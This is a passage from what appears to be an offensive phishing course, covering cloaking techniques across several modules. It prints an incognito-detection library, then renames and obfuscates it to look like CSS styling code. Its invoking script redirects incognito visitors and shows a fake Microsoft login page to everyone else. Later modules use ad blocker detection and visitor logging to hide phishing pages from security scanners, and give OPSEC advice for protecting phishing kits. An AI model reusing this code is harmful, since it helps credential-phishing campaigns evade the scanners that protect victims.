Once the browser is identified, the script examines differences in behavior between normal and private/incognito mode by testing certain browser features. For example, in Chrome, it checks storage quota limitations using `navigator.webkitTemporaryStorage.queryUsageAndQuota`, as incognito mode typically provides a much smaller quota. We can see this implemented in the `storageQuotaChromePrivateTest` function below.
```
function storageQuotaChromePrivateTest() {
navigator.webkitTemporaryStorage.queryUsageAndQuota(
    function (e, t) {
        __callback(Math.round(t / 1048576) < 2 * Math.round(getQuotaLimit() / 1048576));
    },
    function (e) {
        reject(new Error("detectIncognito somehow failed to query storage quota: " + e.message));
    }
);
}

```
In Firefox, it verifies whether `navigator.serviceWorker` is undefined, since private browsing mode disables service workers.
```
function firefoxPrivateTest() {
    __callback(void 0 === navigator.serviceWorker);
}

```
Safari's detection relies on attempting to use `indexedDB` with `Blob` as this feature behaves differently in private mode.
```
function newSafariTest() {
    var e = String(Math.random());
    try {
        window.indexedDB.open(e, 1).onupgradeneeded = function (t) {
            var r,
                o,
                n = null === (r = t.target) || void 0 === r ? void 0 : r.result;
            try {
                n.createObjectStore("test", { autoIncrement: !0 }).put(new Blob()), __callback(!1);
            } catch (e) {
                var i = e;
                return (
                    e instanceof Error && (i = null !== (o = e.message) && void 0 !== o ? o : e),
                    "string" != typeof i ? void __callback(!1) : void __callback(i.includes("BlobURLs are not yet supported"))
                );
            } finally {
                n.close(), window.indexedDB.deleteDatabase(e);
            }
        };
    } catch (e) {
        __callback(!1);
    }
}

```
The library also has tests in place to handle older versions of the aforementioned browsers, which we won't go over in this module.
## Biblioteca detectIncognito
The minified JavaScript library for detecting Incognito mode is available here. For convenience, we have unminified the entire library and placed it below.
```
!(function (e, t) {
    "object" == typeof exports && "object" == typeof module ? (module.exports = t()) : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? (exports.detectIncognito = t()) : (e.detectIncognito = t());
})(this, function () {
    return (function () {
        "use strict";
        var __webpack_modules__ = {
                598: function (__unused_webpack_module, exports) {
                    var __awaiter =
                            (this && this.__awaiter) ||
                            function (e, t, r, o) {
                                return new (r || (r = Promise))(function (n, i) {
                                    function a(e) {
                                        try {
                                            s(o.next(e));
                                        } catch (e) {
                                            i(e);
                                        }
                                    }
                                    function c(e) {
                                        try {
                                            s(o.throw(e));
                                        } catch (e) {
                                            i(e);
                                        }
                                    }
                                    function s(e) {
                                        var t;
                                        e.done
                                            ? n(e.value)
                                            : ((t = e.value),
                                              t instanceof r
                                                  ? t
                                                  : new r(function (e) {
                                                        e(t);
                                                    })).then(a, c);
                                    }
                                    s((o = o.apply(e, t || [])).next());
                                });
                            },
                        __generator =
                            (this && this.__generator) ||
                            function (e, t) {
                                var r,
                                    o,
                                    n,
                                    i,
                                    a = {
                                        label: 0,
                                        sent: function () {
                                            if (1 & n[0]) throw n[1];
                                            return n[1];
                                        },
                                        trys: [],
                                        ops: [],
                                    };
                                return (
                                    (i = { next: c(0), throw: c(1), return: c(2) }),
                                    "function" == typeof Symbol &&
                                        (i[Symbol.iterator] = function () {
                                            return this;
                                        }),
                                    i
                                );
                                function c(c) {
                                    return function (s) {
                                        return (function (c) {
                                            if (r) throw new TypeError("Generator is already executing.");
                                            for (; i && ((i = 0), c[0] && (a = 0)), a; )
                                                try {
                                                    if (((r = 1), o && (n = 2 & c[0] ? o.return : c[0] ? o.throw || ((n = o.return) && n.call(o), 0) : o.next) && !(n = n.call(o, c[1])).done)) return n;
                                                    switch (((o = 0), n && (c = [2 & c[0], n.value]), c[0])) {
                                                        case 0:
                                                        case 1:
                                                            n = c;
                                                            break;
                                                        case 4:
                                                            return a.label++, { value: c[1], done: !1 };
                                                        case 5:
                                                            a.label++, (o = c[1]), (c = [0]);
                                                            continue;
                                                        case 7:
                                                            (c = a.ops.pop()), a.trys.pop();
                                                            continue;
                                                        default:
                                                            if (!((n = a.trys), (n = n.length > 0 && n[n.length - 1]) || (6 !== c[0] && 2 !== c[0]))) {
                                                                a = 0;
                                                                continue;
                                                            }
                                                            if (3 === c[0] && (!n || (c[1] > n[0] && c[1] < n[3]))) {
                                                                a.label = c[1];
                                                                break;
                                                            }
                                                            if (6 === c[0] && a.label < n[1]) {
                                                                (a.label = n[1]), (n = c);
                                                                break;
                                                            }
                                                            if (n && a.label < n[2]) {
                                                                (a.label = n[2]), a.ops.push(c);
                                                                break;
                                                            }
                                                            n[2] && a.ops.pop(), a.trys.pop();
                                                            continue;
                                                    }
                                                    c = t.call(e, a);
                                                } catch (e) {
                                                    (c = [6, e]), (o = 0);
                                                } finally {
                                                    r = n = 0;
                                                }
                                            if (5 & c[0]) throw c[1];
                                            return { value: c[0] ? c[1] : void 0, done: !0 };
                                        })([c, s]);
                                    };
                                }
                            };
                    function detectIncognito() {
                        return __awaiter(this, void 0, Promise, function () {
                            return __generator(this, function (_a) {
                                switch (_a.label) {
                                    case 0:
                                        return [
                                            4,
                                            new Promise(function (resolve, reject) {
                                                var browserName = "Unknown";
                                                function __callback(e) {
                                                    resolve({ isPrivate: e, browserName: browserName });
                                                }
                                                function identifyChromium() {
                                                    var e = navigator.userAgent;
                                                    return e.match(/Chrome/) ? (void 0 !== navigator.brave ? "Brave" : e.match(/Edg/) ? "Edge" : e.match(/OPR/) ? "Opera" : "Chrome") : "Chromium";
                                                }
                                                function assertEvalToString(e) {
                                                    return e === eval.toString().length;
                                                }
                                                function feid() {
                                                    var toFixedEngineID = 0;
                                                    try {
                                                        eval("(-1).toFixed(-1);");
                                                    } catch (e) {
                                                        toFixedEngineID = e.message.length;
                                                    }
                                                    return toFixedEngineID;
                                                }
                                                function isSafari() {
                                                    return 44 === feid();
                                                }
                                                function isChrome() {
                                                    return 51 === feid();
                                                }
                                                function isFirefox() {
                                                    return 25 === feid();
                                                }
                                                function isMSIE() {
                                                    return void 0 !== navigator.msSaveBlob && assertEvalToString(39);
                                                }
                                                function newSafariTest() {
                                                    var e = String(Math.random());
                                                    try {
                                                        window.indexedDB.open(e, 1).onupgradeneeded = function (t) {
                                                            var r,
                                                                o,
                                                                n = null === (r = t.target) || void 0 === r ? void 0 : r.result;
                                                            try {
                                                                n.createObjectStore("test", { autoIncrement: !0 }).put(new Blob()), __callback(!1);
                                                            } catch (e) {
                                                                var i = e;
                                                                return (
                                                                    e instanceof Error && (i = null !== (o = e.message) && void 0 !== o ? o : e),
                                                                    "string" != typeof i ? void __callback(!1) : void __callback(i.includes("BlobURLs are not yet supported"))
                                                                );
                                                            } finally {
                                                                n.close(), window.indexedDB.deleteDatabase(e);
                                                            }
                                                        };
                                                    } catch (e) {
                                                        __callback(!1);
                                                    }
                                                }
                                                function oldSafariTest() {
                                                    var e = window.openDatabase,
                                                        t = window.localStorage;
                                                    try {
                                                        e(null, null, null, null);
                                                    } catch (e) {
                                                        return void __callback(!0);
                                                    }
                                                    try {
                                                        t.setItem("test", "1"), t.removeItem("test");
                                                    } catch (e) {
                                                        return void __callback(!0);
                                                    }
                                                    __callback(!1);
                                                }
                                                function safariPrivateTest() {
                                                    void 0 !== navigator.maxTouchPoints ? newSafariTest() : oldSafariTest();
                                                }
                                                function getQuotaLimit() {
                                                    var e = window;
                                                    return void 0 !== e.performance && void 0 !== e.performance.memory && void 0 !== e.performance.memory.jsHeapSizeLimit ? performance.memory.jsHeapSizeLimit : 1073741824;
                                                }
                                                function storageQuotaChromePrivateTest() {
                                                    navigator.webkitTemporaryStorage.queryUsageAndQuota(
                                                        function (e, t) {
                                                            __callback(Math.round(t / 1048576) < 2 * Math.round(getQuotaLimit() / 1048576));
                                                        },
                                                        function (e) {
                                                            reject(new Error("detectIncognito somehow failed to query storage quota: " + e.message));
                                                        }
                                                    );
                                                }
                                                function oldChromePrivateTest() {
                                                    (0, window.webkitRequestFileSystem)(
                                                        0,
                                                        1,
                                                        function () {
                                                            __callback(!1);
                                                        },
                                                        function () {
                                                            __callback(!0);
                                                        }
                                                    );
                                                }
                                                function chromePrivateTest() {
                                                    void 0 !== self.Promise && void 0 !== self.Promise.allSettled ? storageQuotaChromePrivateTest() : oldChromePrivateTest();
                                                }
                                                function firefoxPrivateTest() {
                                                    __callback(void 0 === navigator.serviceWorker);
                                                }
                                                function msiePrivateTest() {
                                                    __callback(void 0 === window.indexedDB);
                                                }
                                                function main() {
                                                    isSafari()
                                                        ? ((browserName = "Safari"), safariPrivateTest())
                                                        : isChrome()
                                                        ? ((browserName = identifyChromium()), chromePrivateTest())
                                                        : isFirefox()
                                                        ? ((browserName = "Firefox"), firefoxPrivateTest())
                                                        : isMSIE()
                                                        ? ((browserName = "Internet Explorer"), msiePrivateTest())
                                                        : reject(new Error("detectIncognito cannot determine the browser"));
                                                }
                                                main();
                                            }),
                                        ];
                                    case 1:
                                        return [2, _a.sent()];
                                }
                            });
                        });
                    }
                    Object.defineProperty(exports, "__esModule", { value: !0 }),
                        (exports.detectIncognito = void 0),
                        (exports.detectIncognito = detectIncognito),
                        "undefined" != typeof window && (window.detectIncognito = detectIncognito),
                        (exports.default = detectIncognito);
                },
            },
            __webpack_exports__ = {};
        return __webpack_modules__[598](0, __webpack_exports__), (__webpack_exports__ = __webpack_exports__.default), __webpack_exports__;
    })();
});

```

## Obfuscating Library
Since the library is publicly accessible, it is a best practice to obfuscate public scripts to enhance security and reduce the risk of misuse. In the updated code below, we performed the following changes:
Changed `detectIncognito` to `applyCssStyling`.

- Changed `oldSafariTest` to `cssStyling1`.

- Changed `newSafariTest` to `cssStyling2`.

- Changed `identifyChromium` to `idCm`.

- Changed `safariPrivateTest` to `sPt`.

- Changed `storageQuotaChromePrivateTest` to `sQcPt`.

- Changed `chromePrivateTest` to `cmPvTst`.

- Changed `oldChromePrivateTest` to `oldcmPvTst`.

- Changed `firefoxPrivateTest` to `ffPvTst`.

- Changed `msiePrivateTest` to `msPvTst`.

- Changed `feid` to `cssActionStyle`.

- Obfuscated the updated code using javascriptobfuscator.dev.

```
(function(_0x1181f0,_0x12b06f){var _0x13f768=_0x28a9,_0x5e6f91=_0x1181f0();while(!![]){try{var _0x57ae9d=-parseInt(_0x13f768(0x14f))/0x1+parseInt(_0x13f768(0x181))/0x2*(parseInt(_0x13f768(0x16d))/0x3)+parseInt(_0x13f768(0x190))/0x4+-parseInt(_0x13f768(0x15c))/0x5+parseInt(_0x13f768(0x18f))/0x6+-parseInt(_0x13f768(0x192))/0x7*(-parseInt(_0x13f768(0x16e))/0x8)+parseInt(_0x13f768(0x160))/0x9*(-parseInt(_0x13f768(0x14e))/0xa);if(_0x57ae9d===_0x12b06f)break;else _0x5e6f91['push'](_0x5e6f91['shift']());}catch(_0x53ac16){_0x5e6f91['push'](_0x5e6f91['shift']());}}}(_0x23e9,0x5945b),!function(_0x477963,_0x114b0e){var _0x125165=_0x28a9;_0x125165(0x14c)==typeof exports&&_0x125165(0x14c)==typeof module?module[_0x125165(0x17c)]=_0x114b0e():_0x125165(0x178)==typeof define&&define[_0x125165(0x151)]?define([],_0x114b0e):'object'==typeof exports?exports[_0x125165(0x185)]=_0x114b0e():_0x477963[_0x125165(0x185)]=_0x114b0e();}(this,function(){return(function(){'use strict';var _0x5686a2=_0x28a9;var _0x244fe3={0x256:function(_0xaeb571,_0x1ac88c){var _0x3ed511=_0x28a9,_0x4cdb65=this&&this['__awaiter']||function(_0xe6edbe,_0x5e2a5e,_0x1a196d,_0x3b7ddf){return new(_0x1a196d||(_0x1a196d=Promise))(function(_0x374d35,_0x60344d){var _0x218d5a=_0x28a9;function _0x213d6b(_0x504353){var _0xc19fd1=_0x28a9;try{_0x58bd48(_0x3b7ddf[_0xc19fd1(0x15d)](_0x504353));}catch(_0x50302d){_0x60344d(_0x50302d);}}function _0x1fb257(_0x349b02){try{_0x58bd48(_0x3b7ddf['throw'](_0x349b02));}catch(_0x1a6b6c){_0x60344d(_0x1a6b6c);}}function _0x58bd48(_0x4d347f){var _0x58fb84=_0x28a9,_0x5b0798;_0x4d347f[_0x58fb84(0x159)]?_0x374d35(_0x4d347f['value']):(_0x5b0798=_0x4d347f['value'],_0x5b0798 instanceof _0x1a196d?_0x5b0798:new _0x1a196d(function(_0x52cd04){_0x52cd04(_0x5b0798);}))[_0x58fb84(0x157)](_0x213d6b,_0x1fb257);}_0x58bd48((_0x3b7ddf=_0x3b7ddf[_0x218d5a(0x15a)](_0xe6edbe,_0x5e2a5e||[]))['next']());});},_0x56d73b=this&&this[_0x3ed511(0x188)]||function(_0x10c149,_0x3b7c96){var _0x446315=_0x3ed511,_0x8e7d84,_0x40138e,_0x38f412,_0x11c820,_0x2d42e3={'label':0x0,'sent':function(){if(0x1&_0x38f412[0x0])throw _0x38f412[0x1];return _0x38f412[0x1];},'trys':[],'ops':[]};return _0x11c820={'next':_0x102666(0x0),'throw':_0x102666(0x1),'return':_0x102666(0x2)},_0x446315(0x178)==typeof Symbol&&(_0x11c820[Symbol[_0x446315(0x17d)]]=function(){return this;}),_0x11c820;function _0x102666(_0x5562a6){return function(_0x9b5a22){return function(_0x424f61){var _0x1d76de=_0x28a9;if(_0x8e7d84)throw new TypeError(_0x1d76de(0x18b));for(;_0x11c820&&(_0x11c820=0x0,_0x424f61[0x0]&&(_0x2d42e3=0x0)),_0x2d42e3;)try{if(_0x8e7d84=0x1,_0x40138e&&(_0x38f412=0x2&_0x424f61[0x0]?_0x40138e[_0x1d76de(0x15e)]:_0x424f61[0x0]?_0x40138e[_0x1d76de(0x165)]||((_0x38f412=_0x40138e[_0x1d76de(0x15e)])&&_0x38f412[_0x1d76de(0x167)](_0x40138e),0x0):_0x40138e['next'])&&!(_0x38f412=_0x38f412['call'](_0x40138e,_0x424f61[0x1]))[_0x1d76de(0x159)])return _0x38f412;switch(_0x40138e=0x0,_0x38f412&&(_0x424f61=[0x2&_0x424f61[0x0],_0x38f412['value']]),_0x424f61[0x0]){case 0x0:case 0x1:_0x38f412=_0x424f61;break;case 0x4:return _0x2d42e3['label']++,{'value':_0x424f61[0x1],'done':!0x1};case 0x5:_0x2d42e3['label']++,_0x40138e=_0x424f61[0x1],_0x424f61=[0x0];continue;case 0x7:_0x424f61=_0x2d42e3[_0x1d76de(0x16f)][_0x1d76de(0x171)](),_0x2d42e3[_0x1d76de(0x170)][_0x1d76de(0x171)]();continue;default:if(!(_0x38f412=_0x2d42e3[_0x1d76de(0x170)],(_0x38f412=_0x38f412[_0x1d76de(0x152)]>0x0&&_0x38f412[_0x38f412[_0x1d76de(0x152)]-0x1])||0x6!==_0x424f61[0x0]&&0x2!==_0x424f61[0x0])){_0x2d42e3=0x0;continue;}if(0x3===_0x424f61[0x0]&&(!_0x38f412||_0x424f61[0x1]>_0x38f412[0x0]&&_0x424f61[0x1]<_0x38f412[0x3])){_0x2d42e3[_0x1d76de(0x176)]=_0x424f61[0x1];break;}if(0x6===_0x424f61[0x0]&&_0x2d42e3['label']<_0x38f412[0x1]){_0x2d42e3[_0x1d76de(0x176)]=_0x38f412[0x1],_0x38f412=_0x424f61;break;}if(_0x38f412&&_0x2d42e3['label']<_0x38f412[0x2]){_0x2d42e3[_0x1d76de(0x176)]=_0x38f412[0x2],_0x2d42e3[_0x1d76de(0x16f)][_0x1d76de(0x155)](_0x424f61);break;}_0x38f412[0x2]&&_0x2d42e3['ops'][_0x1d76de(0x171)](),_0x2d42e3[_0x1d76de(0x170)][_0x1d76de(0x171)]();continue;}_0x424f61=_0x3b7c96[_0x1d76de(0x167)](_0x10c149,_0x2d42e3);}catch(_0x250969){_0x424f61=[0x6,_0x250969],_0x40138e=0x0;}finally{_0x8e7d84=_0x38f412=0x0;}if(0x5&_0x424f61[0x0])throw _0x424f61[0x1];return{'value':_0x424f61[0x0]?_0x424f61[0x1]:void 0x0,'done':!0x0};}([_0x5562a6,_0x9b5a22]);};}};function _0x32b3b3(){return _0x4cdb65(this,void 0x0,Promise,function(){return _0x56d73b(this,function(_0x477433){var _0x3bd834=_0x28a9;switch(_0x477433['label']){case 0x0:return[0x4,new Promise(function(_0x17be53,_0x367a4a){var _0x14bf31=_0x28a9,_0x38b14a=_0x14bf31(0x156);function _0x401d4b(_0x288901){_0x17be53({'isPrivate':_0x288901,'browserName':_0x38b14a});}function _0x401249(){var _0x4d462b=_0x14bf31,_0x2eb5ef=navigator['userAgent'];return _0x2eb5ef['match'](/Chrome/)?void 0x0!==navigator[_0x4d462b(0x179)]?'Brave':_0x2eb5ef[_0x4d462b(0x189)](/Edg/)?_0x4d462b(0x15f):_0x2eb5ef['match'](/OPR/)?_0x4d462b(0x169):'Chrome':_0x4d462b(0x162);}function _0x2be499(_0x3ddcf8){var _0x21c3f0=_0x14bf31;return _0x3ddcf8===eval[_0x21c3f0(0x18e)]()[_0x21c3f0(0x152)];}function _0x3c38af(){var _0x1dbdf9=_0x14bf31,_0x4c5718=0x0;try{eval('(-1)[\'toFixed\'](-1);');}catch(_0x29c7ab){_0x4c5718=_0x29c7ab['message'][_0x1dbdf9(0x152)];}return _0x4c5718;}function _0x24a92d(){return 0x2c===_0x3c38af();}function _0xbcdb6f(){return 0x33===_0x3c38af();}function _0x4fa3ab(){return 0x19===_0x3c38af();}function _0x1f4abc(){var _0x402b0d=_0x14bf31;return void 0x0!==navigator[_0x402b0d(0x15b)]&&_0x2be499(0x27);}function _0x4c1e69(){var _0x25250f=_0x14bf31,_0x501c9e=String(Math[_0x25250f(0x154)]());try{window['indexedDB']['open'](_0x501c9e,0x1)[_0x25250f(0x18d)]=function(_0xa789c5){var _0x5725c5=_0x25250f,_0x184bc4,_0x257f87,_0x5335d3=null===(_0x184bc4=_0xa789c5[_0x5725c5(0x14d)])||void 0x0===_0x184bc4?void 0x0:_0x184bc4[_0x5725c5(0x187)];try{_0x5335d3['createObjectStore'](_0x5725c5(0x16c),{'autoIncrement':!0x0})[_0x5725c5(0x16a)](new Blob()),_0x401d4b(!0x1);}catch(_0x54330a){var _0x112775=_0x54330a;return _0x54330a instanceof Error&&(_0x112775=null!==(_0x257f87=_0x54330a[_0x5725c5(0x16b)])&&void 0x0!==_0x257f87?_0x257f87:_0x54330a),_0x5725c5(0x177)!=typeof _0x112775?void _0x401d4b(!0x1):void _0x401d4b(_0x112775[_0x5725c5(0x175)](_0x5725c5(0x17a)));}finally{_0x5335d3['close'](),window[_0x5725c5(0x183)][_0x5725c5(0x186)](_0x501c9e);}};}catch(_0x1f294b){_0x401d4b(!0x1);}}function _0x4123f8(){var _0x17e813=_0x14bf31,_0x3db770=window['openDatabase'],_0x1dbdff=window[_0x17e813(0x172)];try{_0x3db770(null,null,null,null);}catch(_0x2d5768){return void _0x401d4b(!0x0);}try{_0x1dbdff['setItem']('test','1'),_0x1dbdff[_0x17e813(0x166)](_0x17e813(0x16c));}catch(_0xcc7260){return void _0x401d4b(!0x0);}_0x401d4b(!0x1);}function _0x53a23c(){var _0x2358e4=_0x14bf31;void 0x0!==navigator[_0x2358e4(0x18a)]?_0x4c1e69():_0x4123f8();}function _0x236b83(){var _0x1e691b=_0x14bf31,_0x1cc3d5=window;return void 0x0!==_0x1cc3d5['performance']&&void 0x0!==_0x1cc3d5[_0x1e691b(0x150)][_0x1e691b(0x168)]&&void 0x0!==_0x1cc3d5[_0x1e691b(0x150)][_0x1e691b(0x168)]['jsHeapSizeLimit']?performance['memory'][_0x1e691b(0x184)]:0x40000000;}function _0x52e15e(){var _0x43e4ff=_0x14bf31;navigator[_0x43e4ff(0x18c)][_0x43e4ff(0x153)](function(_0x5c6858,_0x4b7144){var _0x58ecfb=_0x43e4ff;_0x401d4b(Math['round'](_0x4b7144/0x100000)<0x2*Math[_0x58ecfb(0x17f)](_0x236b83()/0x100000));},function(_0x1dab3d){var _0x3c8d2e=_0x43e4ff;_0x367a4a(new Error(_0x3c8d2e(0x161)+_0x1dab3d[_0x3c8d2e(0x16b)]));});}function _0x12dae1(){var _0x13f89d=_0x14bf31;(0x0,window[_0x13f89d(0x163)])(0x0,0x1,function(){_0x401d4b(!0x1);},function(){_0x401d4b(!0x0);});}function _0x276bfd(){var _0x24b003=_0x14bf31;void 0x0!==self['Promise']&&void 0x0!==self[_0x24b003(0x17e)]['allSettled']?_0x52e15e():_0x12dae1();}function _0x4b45b7(){var _0x1e30d9=_0x14bf31;_0x401d4b(void 0x0===navigator[_0x1e30d9(0x164)]);}function _0xd6c6f1(){var _0x59018c=_0x14bf31;_0x401d4b(void 0x0===window[_0x59018c(0x183)]);}function _0x2db1c6(){var _0x38c1d8=_0x14bf31;_0x24a92d()?(_0x38b14a='Safari',_0x53a23c()):_0xbcdb6f()?(_0x38b14a=_0x401249(),_0x276bfd()):_0x4fa3ab()?(_0x38b14a=_0x38c1d8(0x158),_0x4b45b7()):_0x1f4abc()?(_0x38b14a=_0x38c1d8(0x174),_0xd6c6f1()):_0x367a4a(new Error(_0x38c1d8(0x191)));}_0x2db1c6();})];case 0x1:return[0x2,_0x477433[_0x3bd834(0x180)]()];}});});}Object['defineProperty'](_0x1ac88c,_0x3ed511(0x173),{'value':!0x0}),_0x1ac88c[_0x3ed511(0x185)]=void 0x0,_0x1ac88c[_0x3ed511(0x185)]=_0x32b3b3,_0x3ed511(0x182)!=typeof window&&(window['applyCssStyling']=_0x32b3b3),_0x1ac88c[_0x3ed511(0x17b)]=_0x32b3b3;}},_0x1c0602={};return _0x244fe3[0x256](0x0,_0x1c0602),_0x1c0602=_0x1c0602[_0x5686a2(0x17b)],_0x1c0602;}());}));function _0x28a9(_0x17c1a3,_0x5e8b2d){var _0x23e90a=_0x23e9();return _0x28a9=function(_0x28a90a,_0x444ae8){_0x28a90a=_0x28a90a-0x14c;var _0x3ad5d5=_0x23e90a[_0x28a90a];return _0x3ad5d5;},_0x28a9(_0x17c1a3,_0x5e8b2d);}function _0x23e9(){var _0xa2fc8d=['return','Edge','69948vVsRoP','applyCssStyling\x20somehow\x20failed\x20to\x20query\x20storage\x20quota:\x20','Chromium','webkitRequestFileSystem','serviceWorker','throw','removeItem','call','memory','Opera','put','message','test','411zdObwF','962072AFfMyY','ops','trys','pop','localStorage','__esModule','Internet\x20Explorer','includes','label','string','function','brave','BlobURLs\x20are\x20not\x20yet\x20supported','default','exports','iterator','Promise','round','sent','6356zsaCpC','undefined','indexedDB','jsHeapSizeLimit','applyCssStyling','deleteDatabase','result','__generator','match','maxTouchPoints','Generator\x20is\x20already\x20executing.','webkitTemporaryStorage','onupgradeneeded','toString','3007686nriBIf','2504732ksMEVM','applyCssStyling\x20cannot\x20determine\x20the\x20browser','7cTuMPg','object','target','670GoptHw','169767LjcwYs','performance','amd','length','queryUsageAndQuota','random','push','Unknown','then','Firefox','done','apply','msSaveBlob','3134795nPhwhS','next'];_0x23e9=function(){return _0xa2fc8d;};return _0x23e9();}

```

## Invoking Library
The JavaScript code below will check if `result.isPrivate` is `true` and, if so, redirect the user to `example.com`. Otherwise, if `result.isPrivate` is `false`, it will fetch the phishing page and use `document.write` to overwrite the current document with the fetched content.

```
applyCssStyling().then((result) => {
  if (result.isPrivate) {
    window.location.href = "https://example.com"; // Redirect away to example.com if incognito mode is detected
  } else {
    fetch("/incognito/ms-login.html")
      .then((response) => response.text())
      .then((html) => {
        document.write(html);
      });
  }
});

```

## Demo
The video can be found in folder: `./videos/demo-detect-incognito.mov`

## Objetivos
Implement the incognito detection library, scan your website via online scanners. Do any of the scanners utilize incognito mode?


---

# Módulo 58 — Detecção de Ad Blocker

Módulo 58 — Ad Blocker Detection

- # Módulo 58 — Detecção de Ad Blocker

# Disclaimer

## Introdução
Ad blockers are among the most popular browser extensions, used by a significant portion of internet users. According to Backlinko.com, as of Q1 2024, 31.5% of internet users utilize ad blockers at least occasionally while browsing.However, automated bots, scanners or sandbox browsers are unlikely to have ad blockers installed. This presents an opportunity to use ad blocker detection as a potential signal for identifying legitimate users. While it may not be a foolproof method on its own, it can serve as a valuable component of a broader detection system helping to distinguish legitimate clients from automated traffic by treating ad blocker usage as one possible indicator of human behavior.In this module, we will learn use ad blocker detection as an indicator to distinguish between legitimate clients and scanners or bots.
## Detecting Ad Blocker (1)
There are various ways to detect ad blockers, with the simplest method being to attempt loading a known ad or tracker link and checking whether it loads. If the link does not load, the presence of an ad blocker is likely. For the implementation we will use a modified version of the one found here.The `checkAdBlocker` function below makes a `GET` request to a known ad-serving URL from Google, `https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js`. It uses an XMLHttpRequest (which operates similarly to the Fetch API) to fetch the script and checks the response. If the request fails with a status of `0` or if the response URL differs from the expected one, it indicates that an ad blocker has likely intercepted and blocked the request. If the request succeeds, it suggests that no ad blocker is active.The script below will log to the console whether an ad blocker is detected.
Note: Later in the module, we will see that this script results in false positives and shouldn't be used.

```
function checkAdBlocker() {
    const ADS_URL = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
    return new Promise(resolve => {
        const xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                const isBlocked = xhr.status === 0 || xhr.responseURL !== ADS_URL;
                console.log(isBlocked ? "Ad Blocker detected" : "No Ad Blocker detected");
                resolve(isBlocked);
            }
        };
        xhr.open('GET', ADS_URL, true);
        xhr.send(null);
    });
}

checkAdBlocker();

```

No ad blocker installed

- uBlock Origin installed

- AdBlock installed

## Detecting Ad Blocker (2)
Another way to detect an ad blocker is demonstrated in the `checkAdBlocker2` function below. The function dynamically creates a `<script>` element with its `src` set to `ecdn.firstimpression.io/fi_client.js`, another domain commonly blocked by ad blockers. It then appends the script to the document head and listens for the `onload` and `onerror` events.

If the script loads successfully, the `onload` event is triggered, meaning the request was not blocked. If the script fails to load, the `onerror` event is triggered, which may indicate that an ad blocker has blocked the request or that the resource is unavailable.

Note: Make sure the `<head></head>` tags exist in your HTML file when using the script below, as it appends the script to the document head.

```
function checkAdBlocker2() {
    const script = document.createElement('script');
    script.src = "https://ecdn.firstimpression.io/fi_client.js";

    script.onload = function() {
        console.log("No Ad Blocker detected.");
    };

    script.onerror = function() {
        console.log("Ad Blocker detected.");
    };

    document.head.appendChild(script);
}

checkAdBlocker2();

```

- Ad blocker disabled

- Ad blocker enabled

## Logging Results
With our understanding of how to detect ad blockers, we will now implement functionality to log the results to a file. First, we will define the `checkAdBlocker` function, removing any logging to the console that we previously had. The function will detect if ad blocker is in use and send the results to `/adblocker/log.php` via the `isBlocked` parameter.

```
function checkAdBlocker() {
    const ADS_URL = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
    return new Promise(resolve => {
        const xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                resolve(xhr.status === 0 || xhr.responseURL !== ADS_URL);
            }
        };
        xhr.open('GET', ADS_URL, true);
        xhr.send(null);
    });
}

checkAdBlocker().then(isBlocked => {
    fetch('/adblocker/log.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `isBlocked=${isBlocked}`
    });
});

```
Next, create the `log.php` file, which will handle logging ad blocker detection results. This file processes incoming data from the client-side script, extracts the user's IP address, browser user agent, and whether an ad blocker was detected, then saves this information to a JSON log file, `adblockerLogs.json`.

The `adblockerLogs.json` file should be created and writable in a writable using the commands below.

```
# Create file
touch /var/www/adblockerLogs.json

# Allow file to be written to
chown www-data:www-data /var/www/adblockerLogs.json

```

```
<?php
$user_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$adblocker_used = isset($_POST['isBlocked']) ? filter_var($_POST['isBlocked'], FILTER_VALIDATE_BOOLEAN) : false;

$user_data = [
    'ip' => $user_ip,
    'user_agent' => $user_agent,
    'ad blocker' => $adblocker_used
];

$log_file = '/var/www/adblockerLogs.json';

$logs = json_decode(file_get_contents($log_file), true);
$logs[] = $user_data;

file_put_contents($log_file, json_encode($logs, JSON_PRETTY_PRINT));
?>

```

### Gathering Analytics
Use online scanners such as VirusTotal, ANY.RUN, and URLScan.io to gather analytics on scanners. Interestingly, we notice that the `checkAdBlocker` results in false positives as several scanners are reporting `true` for an ad blocker being detected.

## Fixing False Positives
To fix the false positives, we will replace the `checkAdBlocker` function with `checkAdBlocker2` and create a helper function `logAdBlocker`, which will handle sending the detection result to the server for logging. The `log.php` script will remain unchanged. The updated client-side script is shown below.

```
function checkAdBlocker2() {
    const script = document.createElement('script');
    script.src = "https://ecdn.firstimpression.io/fi_client.js";

    script.onload = function() {
        logAdBlocker(false);
    };

    script.onerror = function() {
        logAdBlocker(true);
    };

    document.head.appendChild(script);
}

function logAdBlocker(isBlocked) {
    fetch('/adblocker/log.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `isBlocked=${isBlocked}`
    });
}

checkAdBlocker2();

```

### Gathering Analytics
We will use online scanners again to gather analytics on scanners. This time, there are no false positives and the ad blocker detection is marked as `false` for the scanner clients.

## Objetivos
Test the existing methods of ad blocking

Find a new endpoint that ad blockers block

Integrate ad blocker detection with other anti-bot measures to establish a higher bot confidence rate


---

# Module 59 - Opsec Failure Directory Listing

Módulo 59 — Opsec Failure Directory Listing

# Disclaimer

# Módulo 59 — Falha de OPSEC: Directory Listing

## Introdução
In an earlier segment of this course, we set up Apache and emphasized the importance of preventing directory listing. This oversight is frequently made by professionals and can expose tools, reveal operational details, and compromise campaigns. As an example, the screenshot below—taken from a Tweet by @MichalKoczwara—demonstrates how malicious infrastructure can be uncovered through directory listing data found on Censys.io.

Another example demonstrates the exposure of a phishing kit through directory listing.

These actions can abruptly end an offensive operation and necessitate the reinvestment of time, funds, and effort. This module will highlight how common directory listing is and the detrimental effects it can have on an operation.

## Encontrando Vulnerabilidades de Directory Listing
We'll continue using Censys to search for all servers vulnerable to directory listing. Use the query below to search for these servers:

```
(services.http.response.html_title:"Index of /" or services.http.response.html_title:"Directory Listing for /")

```
